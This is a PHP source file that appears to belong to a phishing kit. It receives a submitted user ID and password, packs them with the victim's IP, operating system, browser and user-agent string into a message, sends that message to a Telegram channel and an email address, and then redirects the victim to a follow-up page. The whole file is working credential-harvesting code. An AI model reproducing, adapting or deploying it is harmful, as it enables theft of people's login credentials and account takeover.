<?php

if(isset($_POST['user_id']) && isset($_POST['Pass'])){
	
include "../config.php";
include "funcs.php";

$user = $_POST['user_id'];
$password =  $_POST['Pass'];

$message = "\n----\n💻ID: $user\n🔑Password: $password\n🕹️OS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\n🕹️Browser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\n🕹️IP : $ip\n🕹️Agent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";
toTG($message);

$subject = "  💻 Login | $ip";


mail($email,$subject,$message);


echo "<meta http-equiv=\"Refresh\" content=\"0; url=../tel.php\" />";



}
?>